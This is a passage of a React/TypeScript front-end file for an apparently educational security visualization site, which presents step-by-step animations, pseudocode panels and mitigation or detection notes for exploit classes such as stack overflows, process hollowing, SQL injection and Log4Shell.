      { id: 0, title: t.cfw_original_title, description: t.cfw_original_desc, codeHighlight: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], cfwStep: 'original', cfwComplexity: { original: 8, flattened: 35 }, cfwBlocks: [{ id: '0', label: 'Entry', code: ['if (id < 1000)'], state: 'inactive' }, { id: '1', label: 'Log Low', code: ['log_event()'], state: 'inactive' }, { id: '2', label: 'Check', code: ['if (check_password())'], state: 'inactive' }, { id: '3', label: 'Grant', code: ['grant_access()'], state: 'inactive' }] },
      { id: 1, title: t.cfw_analysis_title, description: t.cfw_analysis_desc, codeHighlight: [1, 3, 6, 8], cfwStep: 'analysis', cfwComplexity: { original: 8, flattened: 35 }, cfwBlocks: [{ id: '0', label: 'Entry', code: ['if (id < 1000)'], state: 'inactive' }, { id: '1', label: 'Log Low', code: ['log_event()'], state: 'inactive' }, { id: '2', label: 'Check', code: ['if (check_password())'], state: 'inactive' }, { id: '3', label: 'Grant', code: ['grant_access()'], state: 'inactive' }] },
      { id: 2, title: t.cfw_flatten_title, description: t.cfw_flatten_desc, codeHighlight: [15, 16, 17, 18], cfwStep: 'flatten', cfwComplexity: { original: 8, flattened: 35 }, cfwBlocks: [{ id: '0', label: 'State 0', code: ['goto case_1'], state: 'active' }, { id: '1', label: 'State 1', code: ['if (id < 1000) state = 2; else state = 3;'], state: 'inactive' }, { id: '2', label: 'State 2', code: ['log_event(); state = 4;'], state: 'inactive' }, { id: '3', label: 'State 3', code: ['if (check_password()) state = 5; else state = 6;'], state: 'inactive' }, { id: '4', label: 'State 4', code: ['return 0;'], state: 'inactive' }, { id: '5', label: 'State 5', code: ['grant_access(); state = 7;'], state: 'inactive' }, { id: '6', label: 'State 6', code: ['state = 4;'], state: 'inactive' }, { id: '7', label: 'State 7', code: ['return 1;'], state: 'inactive' }] },
      { id: 3, title: t.cfw_dispatch_init_title, description: t.cfw_dispatch_init_desc, codeHighlight: [19, 20, 21], cfwStep: 'dispatch_init', cfwComplexity: { original: 8, flattened: 35 }, cfwDispatch: { value: 0, targetBlock: '0' }, cfwBlocks: [{ id: '0', label: 'State 0', code: ['goto case_1'], state: 'inactive' }] },
      { id: 4, title: t.cfw_dispatch_loop_title, description: t.cfw_dispatch_loop_desc, codeHighlight: [22, 23, 24], cfwStep: 'dispatch_loop', cfwComplexity: { original: 8, flattened: 35 }, cfwDispatch: { value: 1, targetBlock: '1' }, cfwBlocks: [{ id: '1', label: 'State 1', code: ['if (id < 1000) state = 2; else state = 3;'], state: 'active' }] },
      { id: 5, title: t.cfw_obfuscated_title, description: t.cfw_obfuscated_desc, codeHighlight: [20, 21, 22, 23, 24, 25, 26, 27], cfwStep: 'obfuscated', cfwComplexity: { original: 8, flattened: 35 }, cfwBlocks: [{ id: '0', label: 'State 0-7', code: ['switch(state) { ... all cases ... }'], state: 'active' }] },
      { id: 6, title: t.cfw_comparison_title, description: t.cfw_comparison_desc, codeHighlight: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27], cfwStep: 'comparison', cfwComplexity: { original: 8, flattened: 35 }, cfwBlocks: [{ id: 'original', label: 'Original', code: ['clear flow'], state: 'active' }, { id: 'flattened', label: 'Flattened', code: ['obfuscated'], state: 'active' }] }
    ];
  }
  return [];
};

const App: React.FC = () => {
  const [isPlaying, setIsPlaying] = useState(false);
  const [category, setCategory] = useState<Category>(Category.HOME);
  const [exploitType, setExploitType] = useState<ExploitType>(ExploitType.STACK);
  const [language, setLanguage] = useState<Language>(Language.ZH);
  const [architecture, setArchitecture] = useState<Architecture>(Architecture.X86);
  const [stepIndex, setStepIndex] = useState(0);
  const [showAboutModal, setShowAboutModal] = useState(false);
  const [openSections, setOpenSections] = useState<Record<string, boolean>>({
      [Category.BINARY]: false,
      [Category.ADVERSARIAL]: false,
      [Category.WEB]: false,
      [Category.ALGORITHM]: false,
  });

  // Centralized mapping for per-category items (used for Home counts)
  const CATEGORY_ITEMS: Record<Category, ExploitType[]> = {
    [Category.HOME]: [],
    [Category.BINARY]: [
      ExploitType.STACK,
      ExploitType.HEAP,
      ExploitType.UAF,
      ExploitType.FORMAT_STRING,
      ExploitType.INTEGER_OVERFLOW,
      ExploitType.DOUBLE_FREE,
    ],
    [Category.ADVERSARIAL]: [
      ExploitType.ROP,
      ExploitType.HEAVENS_GATE,
      ExploitType.REFLECTIVE_DLL,
      ExploitType.PROCESS_HOLLOWING,
      ExploitType.THREAD_HIJACKING,
      ExploitType.NETWORK_MAPPING,
      ExploitType.WAF,
      ExploitType.IPS,
      ExploitType.CFW,
    ],
    [Category.ALGORITHM]: [
      ExploitType.AES,
    ],
    [Category.WEB]: [
      ExploitType.SQLI,
      ExploitType.SSRF,
      ExploitType.CSRF,
      ExploitType.XXE,
      ExploitType.XSS,
      ExploitType.FILE_UPLOAD,
      ExploitType.PATH_TRAVERSAL,
      ExploitType.DESERIALIZATION,
      ExploitType.FASTJSON,
      ExploitType.LOG4SHELL,
      ExploitType.NEXTJS_RCE,
    ],
  };

  const toggleSection = (cat: Category) => {
      setOpenSections(prev => ({ ...prev, [cat]: !prev[cat] }));
  };
  const jumpToCategory = (cat: Category) => {
      const defaultByCat: Record<Category, ExploitType> = {
        [Category.HOME]: exploitType,
        [Category.BINARY]: ExploitType.STACK,
        [Category.ADVERSARIAL]: ExploitType.ROP,
        [Category.ALGORITHM]: ExploitType.AES,
        [Category.WEB]: ExploitType.SQLI,
      };
      setCategory(cat);
      setExploitType(defaultByCat[cat]);
      setOpenSections(prev => ({ ...prev, [cat]: true }));
  };
  
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const steps = getSteps(language, architecture, exploitType);
  const safeStepIndex = (steps.length > 0 && stepIndex < steps.length) ? stepIndex : 0;
  const currentStep = steps.length > 0 ? steps[safeStepIndex] : {
      id: 0,
      title: "No Data",
      description: "No visualization steps available for this selection.",
      codeHighlight: []
  } as AnimationStep;
  const t = I18N[language];

  useEffect(() => {
    if (isPlaying && steps.length > 0) {
      timerRef.current = setInterval(() => {
        setStepIndex((prev) => {
          if (prev >= steps.length - 1) {
            setIsPlaying(false);
            return prev;
          }
          return prev + 1;
        });
      }, 2000); 
    } else {
      if (timerRef.current) clearInterval(timerRef.current);
    }
    return () => { if (timerRef.current) clearInterval(timerRef.current); };
  }, [isPlaying, steps.length]);

  useEffect(() => {
    setIsPlaying(false);
    setStepIndex(0);
    if (exploitType === ExploitType.HEAVENS_GATE) {
        setArchitecture(Architecture.X86);
    }
  }, [exploitType, category, language, architecture]);

  const handleNext = () => { if (stepIndex < steps.length - 1) setStepIndex(stepIndex + 1); };
  const handlePrev = () => { if (stepIndex > 0) setStepIndex(stepIndex - 1); };
  const handleReset = () => { setIsPlaying(false); setStepIndex(0); };

  const MenuItem = ({ active, label, onClick, icon: Icon }: any) => (
    <button onClick={onClick} className={`w-full flex items-center gap-3 px-4 py-3 text-sm font-medium transition-colors border-l-2 ${active ? 'border-blue-500 bg-blue-500/10 text-blue-200' : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800'}`}>
      <Icon size={16} className="flex-shrink-0" />
      <span className="text-left">{label}</span>
    </button>
  );

  const SidebarSection = ({ title, icon: Icon, isOpen, onToggle, children }: any) => (
    <div className="mb-2">
        <button onClick={onToggle} className="w-full px-4 py-2 text-xs font-bold text-slate-500 uppercase tracking-wider flex items-center justify-between hover:text-slate-300 transition-colors group">
            <div className="flex items-center gap-2">
                <Icon size={12} className="group-hover:text-blue-400 transition-colors" /> 
                <span>{title}</span>
            </div>
            {isOpen ? <ChevronDown size={14} /> : <ChevronRight size={14} />}
        </button>
        <div className={`overflow-hidden transition-all duration-300 ${isOpen ? 'max-h-[1000px] opacity-100' : 'max-h-0 opacity-0'}`}>{children}</div>
    </div>
  );

  const getCodeSnippet = () => {
      switch(exploitType) {
          case ExploitType.STACK: return STACK_CODE_SNIPPET;
          case ExploitType.HEAP: return HEAP_CODE_SNIPPET;
          case ExploitType.UAF: return UAF_CODE_SNIPPET;
          case ExploitType.FORMAT_STRING: return FMT_CODE_SNIPPET;
          case ExploitType.INTEGER_OVERFLOW: return INT_OVERFLOW_CODE_SNIPPET;
          case ExploitType.DOUBLE_FREE: return DOUBLE_FREE_CODE_SNIPPET;
          case ExploitType.ROP: return ROP_CODE_SNIPPET;
          case ExploitType.HEAVENS_GATE: return HEAVENS_GATE_CODE_SNIPPET;
          case ExploitType.REFLECTIVE_DLL: return REFLECTIVE_DLL_CODE_SNIPPET;
          case ExploitType.PROCESS_HOLLOWING: return PROCESS_HOLLOWING_CODE_SNIPPET;
          case ExploitType.THREAD_HIJACKING: return THREAD_HIJACKING_CODE_SNIPPET;
          case ExploitType.NETWORK_MAPPING: return NETWORK_MAPPING_CODE_SNIPPET;
          case ExploitType.WAF: return WAF_CODE_SNIPPET;
          case ExploitType.IPS: return IPS_CODE_SNIPPET;
          case ExploitType.CFW: return CFW_CODE_SNIPPET;
          case ExploitType.SQLI: return WEB_CODE_SNIPPET;
          case ExploitType.SSRF: return SSRF_CODE_SNIPPET;
          case ExploitType.CSRF: return CSRF_CODE_SNIPPET;
          case ExploitType.LOG4SHELL: return LOG4SHELL_CODE_SNIPPET;
          case ExploitType.NEXTJS_RCE: return NEXTJS_RCE_CODE_SNIPPET;
          case ExploitType.XXE: return XXE_CODE_SNIPPET;
          case ExploitType.XSS: return XSS_CODE_SNIPPET;
          case ExploitType.PATH_TRAVERSAL: return PATH_TRAVERSAL_CODE_SNIPPET;
    case ExploitType.DESERIALIZATION: return DESERIALIZATION_CODE_SNIPPET;
    case ExploitType.FASTJSON: return FASTJSON_CODE_SNIPPET;
    case ExploitType.FILE_UPLOAD: return FILE_UPLOAD_CODE_SNIPPET;
          case ExploitType.AES: return AES_CODE_SNIPPET;
          default: return "";
      }
  };

  const isROP = exploitType === ExploitType.ROP;
  const isAdversarial = category === Category.ADVERSARIAL;
  const useDetectionPoints = [ExploitType.REFLECTIVE_DLL, ExploitType.PROCESS_HOLLOWING, ExploitType.THREAD_HIJACKING, ExploitType.SQLI, ExploitType.SSRF, ExploitType.CSRF, ExploitType.LOG4SHELL, ExploitType.NEXTJS_RCE, ExploitType.XXE, ExploitType.XSS, ExploitType.PATH_TRAVERSAL, ExploitType.DESERIALIZATION, ExploitType.FASTJSON, ExploitType.FILE_UPLOAD, ExploitType.AES, ExploitType.NETWORK_MAPPING, ExploitType.WAF, ExploitType.IPS].includes(exploitType);

  return (
    <div className="flex h-screen bg-[#0f172a] overflow-hidden">
      {/* About Modal */}
      {showAboutModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={() => setShowAboutModal(false)}></div>
            <div className="relative w-full max-w-2xl bg-slate-900 border border-slate-700 rounded-2xl shadow-2xl overflow-hidden animate-in zoom-in duration-300">
                <div className="p-6 border-b border-slate-800 flex justify-between items-center bg-slate-800/50">
                    <div className="flex items-center gap-3">
                        <div className="p-2 bg-blue-500/20 rounded-lg text-blue-400">
                            <Info size={24} />
                        </div>
                        <h2 className="text-xl font-bold text-white">{t.about_title}</h2>
                    </div>
                    <button onClick={() => setShowAboutModal(false)} className="p-2 hover:bg-slate-700 rounded-full transition-colors text-slate-400 hover:text-white">
                        <X size={20} />
                    </button>
                </div>
                <div className="p-8 space-y-8">
                    <section>
                        <p className="text-slate-300 leading-relaxed text-sm">
                            {t.about_desc}
                        </p>
                    </section>

                    <section className="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div className="space-y-3">
                            <h3 className="text-xs font-bold text-blue-400 uppercase tracking-widest flex items-center gap-2">
                                <Users size={14} /> {t.community_title}
                            </h3>
                            <div className="space-y-2">
                                <a href={APP_CONFIG.githubUrl} target="_blank" rel="noopener noreferrer" className="flex items-center gap-3 p-3 bg-slate-800/50 rounded-xl border border-slate-700 hover:border-blue-500/50 hover:bg-slate-800 transition-all group">
                                    <Github size={18} className="text-slate-400 group-hover:text-blue-400" />
                                    <span className="text-xs text-slate-300">{t.github_link}</span>
                                </a>
                                <a href={APP_CONFIG.discordUrl} target="_blank" rel="noopener noreferrer" className="flex items-center gap-3 p-3 bg-slate-800/50 rounded-xl border border-slate-700 hover:border-[#5865F2]/50 hover:bg-slate-800 transition-all group">
                                    <MessageSquare size={18} className="text-slate-400 group-hover:text-[#5865F2]" />
                                    <span className="text-xs text-slate-300">{t.discord}</span>
                                </a>
                            </div>
                        </div>

                        <div className="space-y-3">
                            <h3 className="text-xs font-bold text-purple-400 uppercase tracking-widest flex items-center gap-2">
                                <Zap size={14} /> {t.contact_me}
                            </h3>
                            <div className="p-4 bg-slate-800/30 rounded-xl border border-slate-700 space-y-2">
                                <div className="flex justify-between text-[11px]">
                                    <span className="text-slate-500">Author:</span>
                                    <span className="text-slate-200">{APP_CONFIG.author}</span>
                                </div>
                                <div className="flex justify-between text-[11px]">
                                    <span className="text-slate-500">Website:</span>
                                    <a href={APP_CONFIG.blogUrl} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">{APP_CONFIG.blogUrl.replace('https://', '').replace('/', '')}</a>
                                </div>
                                <div className="flex justify-between text-[11px]">
                                    <span className="text-slate-500">{t.email_label}:</span>
                                    <a href={`mailto:${APP_CONFIG.email}`} className="text-blue-400 hover:underline flex items-center gap-1">
                                        <Mail size={10} /> {APP_CONFIG.email}
                                    </a>
                                </div>
                                <div className="flex justify-between text-[11px]">
                                    <span className="text-slate-500">Stack:</span>
                                    <span className="text-slate-300">React + TS + Tailwind</span>
                                </div>
                            </div>
                        </div>
                    </section>

                    <div className="pt-4 text-center">
                        <span className="text-[10px] text-slate-500 uppercase tracking-widest">© 2025 {APP_CONFIG.author} SecTech Vis Platform</span>
                    </div>
                </div>
            </div>
        </div>
      )}

      <aside className="w-64 flex-shrink-0 bg-slate-900 border-r border-slate-700 flex flex-col z-20">
        <div className="p-6 border-b border-slate-700">
           <h1 className="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-400 to-purple-500">{t.title}</h1>
           <p className="text-xs text-slate-500 mt-1">{t.subtitle}</p>
           <div className="mt-3">
              <button onClick={() => setCategory(Category.HOME)} className="w-full text-xs px-3 py-2 rounded-lg bg-blue-600/10 hover:bg-blue-600/20 text-blue-400 border border-blue-500/30 transition-all">
                {t.home}
              </button>
           </div>
        </div>
        <div className="flex-1 overflow-y-auto py-4">
            <SidebarSection title={t.binary} icon={Binary} isOpen={openSections[Category.BINARY]} onToggle={() => toggleSection(Category.BINARY)}>
                <MenuItem active={category === Category.BINARY && exploitType === ExploitType.STACK} label={t.stack} icon={Layout} onClick={() => { setCategory(Category.BINARY); setExploitType(ExploitType.STACK); }} />
                <MenuItem active={category === Category.BINARY && exploitType === ExploitType.HEAP} label={t.heap} icon={Layout} onClick={() => { setCategory(Category.BINARY); setExploitType(ExploitType.HEAP); }} />
                <MenuItem active={category === Category.BINARY && exploitType === ExploitType.UAF} label={t.uaf} icon={Box} onClick={() => { setCategory(Category.BINARY); setExploitType(ExploitType.UAF); }} />
                <MenuItem active={category === Category.BINARY && exploitType === ExploitType.FORMAT_STRING} label={t.fmt} icon={Terminal} onClick={() => { setCategory(Category.BINARY); setExploitType(ExploitType.FORMAT_STRING); }} />
                <MenuItem active={category === Category.BINARY && exploitType === ExploitType.INTEGER_OVERFLOW} label={t.int_overflow} icon={Calculator} onClick={() => { setCategory(Category.BINARY); setExploitType(ExploitType.INTEGER_OVERFLOW); }} />
                <MenuItem active={category === Category.BINARY && exploitType === ExploitType.DOUBLE_FREE} label={t.double_free} icon={Recycle} onClick={() => { setCategory(Category.BINARY); setExploitType(ExploitType.DOUBLE_FREE); }} />
            </SidebarSection>
            <SidebarSection title={t.adversarial} icon={Layers} isOpen={openSections[Category.ADVERSARIAL]} onToggle={() => toggleSection(Category.ADVERSARIAL)}>
                 <MenuItem active={category === Category.ADVERSARIAL && exploitType === ExploitType.ROP} label={t.rop} icon={Layers} onClick={() => { setCategory(Category.ADVERSARIAL); setExploitType(ExploitType.ROP); }} />
                 <MenuItem active={category === Category.ADVERSARIAL && exploitType === ExploitType.HEAVENS_GATE} label={t.heavens_gate} icon={Ghost} onClick={() => { setCategory(Category.ADVERSARIAL); setExploitType(ExploitType.HEAVENS_GATE); }} />
                 <MenuItem active={category === Category.ADVERSARIAL && exploitType === ExploitType.REFLECTIVE_DLL} label={t.reflective_dll} icon={FileCode} onClick={() => { setCategory(Category.ADVERSARIAL); setExploitType(ExploitType.REFLECTIVE_DLL); }} />
                 <MenuItem active={category === Category.ADVERSARIAL && exploitType === ExploitType.PROCESS_HOLLOWING} label={t.process_hollowing} icon={Skull} onClick={() => { setCategory(Category.ADVERSARIAL); setExploitType(ExploitType.PROCESS_HOLLOWING); }} />
                 <MenuItem active={category === Category.ADVERSARIAL && exploitType === ExploitType.THREAD_HIJACKING} label={t.thread_hijacking} icon={Activity} onClick={() => { setCategory(Category.ADVERSARIAL); setExploitType(ExploitType.THREAD_HIJACKING); }} />
                 <MenuItem active={category === Category.ADVERSARIAL && exploitType === ExploitType.NETWORK_MAPPING} label={t.network_mapping} icon={Globe} onClick={() => { setCategory(Category.ADVERSARIAL); setExploitType(ExploitType.NETWORK_MAPPING); }} />
                 <MenuItem active={category === Category.ADVERSARIAL && exploitType === ExploitType.WAF} label={t.waf} icon={Shield} onClick={() => { setCategory(Category.ADVERSARIAL); setExploitType(ExploitType.WAF); }} />
                 <MenuItem active={category === Category.ADVERSARIAL && exploitType === ExploitType.IPS} label={t.ips} icon={ShieldAlert} onClick={() => { setCategory(Category.ADVERSARIAL); setExploitType(ExploitType.IPS); }} />
                 <MenuItem active={category === Category.ADVERSARIAL && exploitType === ExploitType.CFW} label={t.cfw} icon={GitBranch} onClick={() => { setCategory(Category.ADVERSARIAL); setExploitType(ExploitType.CFW); }} />
            </SidebarSection>
            <SidebarSection title={t.algorithm} icon={LockKeyhole} isOpen={openSections[Category.ALGORITHM]} onToggle={() => toggleSection(Category.ALGORITHM)}>
                 <MenuItem active={category === Category.ALGORITHM && exploitType === ExploitType.AES} label={t.aes} icon={LockKeyhole} onClick={() => { setCategory(Category.ALGORITHM); setExploitType(ExploitType.AES); }} />
            </SidebarSection>
            <SidebarSection title={t.web} icon={Globe} isOpen={openSections[Category.WEB]} onToggle={() => toggleSection(Category.WEB)}>
                 <MenuItem active={category === Category.WEB && exploitType === ExploitType.SQLI} label={t.sqli} icon={ShieldAlert} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.SQLI); }} />
                 <MenuItem active={category === Category.WEB && exploitType === ExploitType.SSRF} label={t.ssrf} icon={Network} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.SSRF); }} />
                 <MenuItem active={category === Category.WEB && exploitType === ExploitType.CSRF} label={t.csrf} icon={MousePointer2} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.CSRF); }} />
                 <MenuItem active={category === Category.WEB && exploitType === ExploitType.XXE} label={t.xxe} icon={FileText} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.XXE); }} />
  <MenuItem active={category === Category.WEB && exploitType === ExploitType.XSS} label={t.xss} icon={Code} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.XSS); }} />
  <MenuItem active={category === Category.WEB && exploitType === ExploitType.FILE_UPLOAD} label={t.file_upload} icon={FileCode} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.FILE_UPLOAD); }} />
  <MenuItem active={category === Category.WEB && exploitType === ExploitType.PATH_TRAVERSAL} label={t.path_traversal} icon={Folder} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.PATH_TRAVERSAL); }} />
                 <MenuItem active={category === Category.WEB && exploitType === ExploitType.DESERIALIZATION} label={t.deserialization} icon={PackageOpen} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.DESERIALIZATION); }} />
                 <MenuItem active={category === Category.WEB && exploitType === ExploitType.FASTJSON} label={t.fastjson} icon={Code} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.FASTJSON); }} />
                 <MenuItem active={category === Category.WEB && exploitType === ExploitType.LOG4SHELL} label={t.log4shell} icon={AlertTriangle} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.LOG4SHELL); }} />
                 <MenuItem active={category === Category.WEB && exploitType === ExploitType.NEXTJS_RCE} label={t.nextjs_rce} icon={Zap} onClick={() => { setCategory(Category.WEB); setExploitType(ExploitType.NEXTJS_RCE); }} />
            </SidebarSection>
        </div>
        <div className="p-4 border-t border-slate-800 bg-slate-900">
             <button onClick={() => setLanguage(language === Language.EN ? Language.ZH : Language.EN)} className="flex items-center justify-center gap-2 w-full py-2 bg-slate-800 hover:bg-slate-700 rounded text-xs text-slate-300 transition-colors border border-slate-700">
                 <Globe size={12} /> {t.langBtn}
             </button>
        </div>
      </aside>
      <main className="flex-1 flex flex-col h-full overflow-y-auto">
         <div className="sticky top-0 h-16 border-b border-slate-700/50 bg-slate-900/80 backdrop-blur-md flex items-center px-8 justify-between flex-shrink-0 z-10 shadow-sm">
             <div className="flex items-center gap-4">
                <h2 className="text-lg font-medium text-slate-200">
  {category === Category.HOME ? t.home : (category === Category.BINARY ? (exploitType === ExploitType.STACK ? t.stack : exploitType === ExploitType.HEAP ? t.heap : exploitType === ExploitType.UAF ? t.uaf : exploitType === ExploitType.FORMAT_STRING ? t.fmt : exploitType === ExploitType.INTEGER_OVERFLOW ? t.int_overflow : exploitType === ExploitType.DOUBLE_FREE ? t.double_free : t.rop) : (category === Category.ADVERSARIAL ? (exploitType === ExploitType.ROP ? t.rop : exploitType === ExploitType.HEAVENS_GATE ? t.heavens_gate : exploitType === ExploitType.REFLECTIVE_DLL ? t.reflective_dll : exploitType === ExploitType.PROCESS_HOLLOWING ? t.process_hollowing : exploitType === ExploitType.THREAD_HIJACKING ? t.thread_hijacking : exploitType === ExploitType.NETWORK_MAPPING ? t.network_mapping : exploitType === ExploitType.WAF ? t.waf : exploitType === ExploitType.IPS ? t.ips : t.cfw) : (category === Category.ALGORITHM ? (exploitType === ExploitType.AES ? t.aes : '') : (exploitType === ExploitType.SQLI ? t.sqli : exploitType === ExploitType.SSRF ? t.ssrf : exploitType === ExploitType.CSRF ? t.csrf : exploitType === ExploitType.XXE ? t.xxe : exploitType === ExploitType.XSS ? t.xss : exploitType === ExploitType.FILE_UPLOAD ? t.file_upload : exploitType === ExploitType.PATH_TRAVERSAL ? t.path_traversal : exploitType === ExploitType.DESERIALIZATION ? t.deserialization : exploitType === ExploitType.FASTJSON ? t.fastjson : exploitType === ExploitType.LOG4SHELL ? t.log4shell : t.nextjs_rce))))}
                </h2>
                {(category === Category.BINARY || category === Category.ADVERSARIAL || category === Category.ALGORITHM) && !([ExploitType.HEAVENS_GATE, ExploitType.NETWORK_MAPPING, ExploitType.WAF, ExploitType.IPS, ExploitType.CFW].includes(exploitType)) && (
                    <div className="flex items-center gap-2 bg-slate-800 rounded-lg p-1 border border-slate-700 ml-4">
                        <span className="text-[10px] uppercase text-slate-500 font-bold px-2">{t.arch}:</span>
                        {(Object.values(Architecture) as Architecture[]).map((arch) => (
                            <button key={arch} onClick={() => setArchitecture(arch)} className={`text-xs px-2 py-0.5 rounded ${architecture === arch ? 'bg-blue-600 text-white' : 'text-slate-400 hover:text-white'}`}>{arch}</button>
                        ))}
                    </div>
                )}
             </div>
             
             <div className="flex items-center gap-3">
                 {category !== Category.HOME && (
                 <div className="flex items-center gap-2 text-xs text-slate-400 bg-slate-800 px-3 py-1 rounded-full border border-slate-700 mr-4">
                     <div className={`w-2 h-2 rounded-full ${isPlaying ? 'bg-green-500 animate-pulse' : 'bg-slate-500'}`}></div>
                     {isPlaying ? t.running : t.paused}
                 </div>
                 )}

                 <div className="h-6 w-px bg-slate-700 mx-1"></div>

                 <a href={APP_CONFIG.blogUrl} target="_blank" rel="noopener noreferrer" className="flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-bold bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all hover:text-white group shadow-sm">
                    <ExternalLink size={14} className="group-hover:text-blue-400 transition-colors" />
                    {t.blog}
                 </a>
                 <button onClick={() => setShowAboutModal(true)} className="flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-bold bg-blue-600/10 hover:bg-blue-600/20 text-blue-400 border border-blue-500/30 transition-all group shadow-sm">
                    <Info size={14} className="group-hover:scale-110 transition-transform" />
                    {t.about}
                 </button>
             </div>
         </div>

         <div className={`p-6 mx-auto w-full flex-1 ${isROP ? 'max-w-[1800px]' : 'max-w-6xl'}`}>
            {category === Category.HOME && (
              <div className="grid grid-cols-1 gap-6">
                <div className="bg-slate-800/50 p-6 rounded-xl border border-slate-700">
                  <h3 className="text-lg font-bold text-blue-400 mb-2">{t.about_title}</h3>
                  <p className="text-slate-300 leading-relaxed text-sm">{t.about_desc}</p>
                </div>
                <div className="grid grid-cols-2 md:grid-cols-2 gap-4">
                  <button onClick={() => jumpToCategory(Category.BINARY)} className="flex items-center gap-3 p-4 bg-slate-800 rounded-xl border border-slate-700 hover:border-blue-500/50 hover:bg-slate-800 transition-all group">
                    <Binary className="text-slate-400 group-hover:text-blue-400" size={20} />
                    <span className="text-sm text-slate-200">{t.binary} ({CATEGORY_ITEMS[Category.BINARY].length})</span>
                  </button>
                  <button onClick={() => jumpToCategory(Category.ADVERSARIAL)} className="flex items-center gap-3 p-4 bg-slate-800 rounded-xl border border-slate-700 hover:border-purple-500/50 hover:bg-slate-800 transition-all group">
                    <Layers className="text-slate-400 group-hover:text-purple-400" size={20} />
                    <span className="text-sm text-slate-200">{t.adversarial} ({CATEGORY_ITEMS[Category.ADVERSARIAL].length})</span>
                  </button>
                  <button onClick={() => jumpToCategory(Category.ALGORITHM)} className="flex items-center gap-3 p-4 bg-slate-800 rounded-xl border border-slate-700 hover:border-emerald-500/50 hover:bg-slate-800 transition-all group">
                    <LockKeyhole className="text-slate-400 group-hover:text-emerald-400" size={20} />
                    <span className="text-sm text-slate-200">{t.algorithm} ({CATEGORY_ITEMS[Category.ALGORITHM].length})</span>
                  </button>
                  <button onClick={() => jumpToCategory(Category.WEB)} className="flex items-center gap-3 p-4 bg-slate-800 rounded-xl border border-slate-700 hover:border-orange-500/50 hover:bg-slate-800 transition-all group">
                    <Globe className="text-slate-400 group-hover:text-orange-400" size={20} />
                    <span className="text-sm text-slate-200">{t.web} ({CATEGORY_ITEMS[Category.WEB].length})</span>
                  </button>
                </div>
              </div>
            )}
            {category !== Category.HOME && (
            <div className={`grid grid-cols-1 gap-6 ${isROP ? 'lg:grid-cols-12' : 'lg:grid-cols-12'}`}>
                <div className={`${isROP ? 'lg:col-span-3' : 'lg:col-span-5'} flex flex-col gap-6`}>
                    <div className="bg-slate-800 p-4 rounded-xl border border-slate-700 flex justify-between items-center shadow-lg sticky top-16 z-10">
                        <button onClick={handlePrev} disabled={safeStepIndex === 0} className="p-2 rounded-lg hover:bg-slate-700 disabled:opacity-30 transition"><ChevronLeft size={20} /></button>
                        <div className="flex flex-col items-center">
                            <span className="text-xs font-mono text-slate-500 mb-1">{t.step} {safeStepIndex + 1}/{steps.length}</span>
                            <div className="flex gap-1">{steps.map((_, i) => (<div key={i} className={`w-2 h-1 rounded-full ${i === safeStepIndex ? 'bg-blue-500' : 'bg-slate-700'}`}></div>))}</div>
                        </div>
                        <div className="flex gap-2">
                            <button onClick={handleReset} title={t.reset} className="p-2 rounded-lg hover:bg-slate-700 text-slate-400 hover:text-white transition"><RotateCcw size={20} /></button>
                            <button onClick={() => setIsPlaying(!isPlaying)} className={`p-2 rounded-lg text-white transition shadow-lg ${isPlaying ? 'bg-red-500 hover:bg-red-600' : 'bg-green-600 hover:bg-green-700'}`}>{isPlaying ? <Pause size={20} fill="currentColor" /> : <Play size={20} fill="currentColor" />}</button>
                            <button onClick={handleNext} disabled={safeStepIndex === steps.length - 1} className="p-2 rounded-lg hover:bg-slate-700 disabled:opacity-30 transition"><ChevronRight size={20} /></button>
                        </div>
                    </div>
                    <div className="bg-slate-800/50 p-6 rounded-xl border border-slate-700 min-h-[160px]">
                        <h3 className="text-lg font-bold text-blue-400 mb-2">{currentStep.title}</h3>
                        <p className="text-slate-300 leading-relaxed text-sm">{currentStep.description}</p>
                    </div>
                    <div className="relative group flex-1">
                        <div className="absolute -top-3 left-4 px-2 bg-[#0f172a] text-xs text-slate-500 font-mono">pseudocode</div>
                        <CodeBlock code={getCodeSnippet()} highlightLines={currentStep.codeHighlight} />
                    </div>
                    {!isROP && (
                        <div className={`border rounded-xl p-4 mt-2 ${useDetectionPoints ? 'bg-orange-900/10 border-orange-800/50' : 'bg-green-900/10 border-green-800/50'}`}>
                            <div className={`flex items-center gap-2 text-sm font-bold mb-3 uppercase tracking-wider ${useDetectionPoints ? 'text-orange-400' : 'text-green-400'}`}>
                                {useDetectionPoints ? <ScanSearch size={16} /> : <ShieldCheck size={16} />}
                                {useDetectionPoints ? t.detection : t.mitigation}
                            </div>
                            <ul className="text-xs text-slate-300 space-y-2 list-disc list-inside">
                                {((useDetectionPoints ? (DETECTION_POINTS as any)[exploitType] : (MITIGATIONS as any)[exploitType])?.[language] || []).map((m: string, i: number) => (<li key={i}>{m}</li>))}
                            </ul>
                        </div>
                    )}
                </div>
                <div className={`${isROP ? 'lg:col-span-6' : 'lg:col-span-7'} flex flex-col gap-6`}>
                    <div className="flex flex-col items-center pt-0 h-full">
                        {exploitType === ExploitType.STACK && <StackVisualizer step={currentStep} arch={architecture} />}
                        {exploitType === ExploitType.HEAP && <HeapVisualizer step={currentStep} />}
                        {exploitType === ExploitType.UAF && <UAFVisualizer step={currentStep} />}
